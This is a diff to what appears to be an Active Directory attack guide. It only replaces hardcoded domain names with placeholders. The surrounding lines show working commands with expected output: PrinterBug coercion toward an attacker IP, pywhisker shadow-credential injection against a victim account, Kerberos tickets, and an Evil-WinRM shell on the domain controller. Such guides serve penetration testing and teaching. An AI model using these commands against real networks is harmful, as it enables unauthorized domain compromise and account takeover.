@@ -5730,7 +5730,7 @@ Attackers can either wait for victims to attempt authentication against their ma
 **Run printerbug.py**
 
 ```bash
-python3 printerbug.py CORP.LOCAL/<USER>:"<USER>"@<DC01_IP> <ATTACKER_IP>
+python3 printerbug.py <CORP.LOCAL>/<USER>:"<USER>"@<DC01_IP> <ATTACKER_IP>
 ```
 
 **Expected output**
@@ -5849,14 +5849,14 @@ We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform thi
 **Generate a X.509 certificate and write the public key to the victim user's msDS-KeyCredentialLink attribute**
 
 ```bash
-pywhisker --dc-ip <DC01_IP> -d CORP.LOCAL -u wwhite -p '<PASSWORD>' --target <USER> --action add
+pywhisker --dc-ip <DC01_IP> -d <CORP.LOCAL> -u wwhite -p '<PASSWORD>' --target <USER> --action add
 ```
 
 **Expected Output**
 
 ```bash
 # [*] Searching for the target account
-# [*] Target user found: CN=<FULL NAME>,CN=Users,DC=corp,DC=local
+# [*] Target user found: CN=<FULL NAME>,CN=Users,DC=<corp>,DC=local
 # [*] Generating certificate
 # [*] Certificate generated
 # [*] Generating KeyCredential
@@ -5905,16 +5905,16 @@ klist
 
 ```bash
 # Ticket cache: FILE:/tmp/jpinkman.ccache
-# Default principal: jpinkman@CORP.LOCAL
+# Default principal: jpinkman@<CORP.LOCAL>
 
 # Valid starting       Expires              Service principal
-# 04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/CORP.LOCAL@CORP.LOCAL
+# 04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/<CORP.LOCAL>@<CORP.LOCAL>
 ```
 
 In this case, we discovered that the victim user is a member of the **Remote Management Users** group, which permits them to connect to the machine via WinRM. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):
 
 ```bash
-evil-winrm -i dc01.corp.local -r corp.local
+evil-winrm -i dc01.<corp.local> -r <corp.local>
 ```
 
 **Expected Output:**
@@ -5928,7 +5928,7 @@ evil-winrm -i dc01.corp.local -r corp.local
 
 # Info: Establishing connection to remote endpoint
 # *Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
-# corp\jpinkman
+# <corp>\jpinkman
 ```
 
 </details>
